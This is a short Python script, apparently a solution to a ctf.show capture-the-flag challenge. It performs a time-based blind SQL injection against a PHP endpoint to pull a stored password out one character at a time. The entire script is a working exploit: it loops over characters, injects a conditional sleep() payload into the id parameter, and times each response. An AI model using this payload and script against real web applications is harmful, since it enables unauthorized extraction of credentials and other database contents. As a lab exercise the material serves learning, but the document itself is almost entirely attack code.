import requests
import time

url = "http://9cb608df-e447-434e-b864-67001d4b869d.challenge.ctf.show:8080/api/v5.php"
dict = "0123456789abcdefghijklmnopqrstuvwxyz{}-"
flag = ""
for i in range(1, 50):
    for j in dict:
        payload = f"?id=1' and if(substr((select password from ctfshow_user5 where username=\"flag\"),{i},1)=\"{j}\",sleep(5),0)--+"
        gloal = url + payload
        start = time.time()
        res = requests.get(url=gloal)
        end = time.time()
        if end - start > 4.9:
            flag += j
            print(flag)
            break
